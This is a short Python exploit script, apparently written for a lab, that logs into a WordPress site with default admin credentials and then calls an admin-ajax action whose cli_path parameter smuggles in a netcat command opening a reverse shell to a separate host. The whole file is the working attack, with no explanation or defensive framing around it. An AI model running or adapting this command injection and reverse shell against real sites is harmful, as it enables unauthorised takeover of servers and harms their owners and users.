#!/usr/bin/python3

import requests
import pyfiglet
from colorama import Fore

# Create the banner
banner = pyfiglet.figlet_format("RC3-WP")

print(Fore.YELLOW + banner)


session = requests.Session()
url = "http://192.168.19.129/wordpress/wp-login.php"

data = {"log":"admin","pwd":"password","wp-submit":"Log In"}

res = session.post(url,data=data)

url2 = "http://192.168.19.129/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=d;nc 172.27.166.53 5555 -e /bin/bash;echo 'done'"

res2 = session.get(url2)